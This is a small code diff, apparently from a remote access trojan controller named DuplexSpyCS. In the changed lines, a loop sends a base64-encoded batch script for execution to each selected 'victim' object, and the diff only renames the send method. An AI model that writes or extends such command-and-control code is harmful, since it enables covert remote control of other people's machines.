@@ -36,7 +36,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in listView1.CheckedItems)
             {
                 clsVictim v = (clsVictim)item.Tag;
-                v.encSend(2, 0, "exec|batch|" + b64Script);
+                v.fnSendCommand("exec|batch|" + b64Script);
             }
         }
 
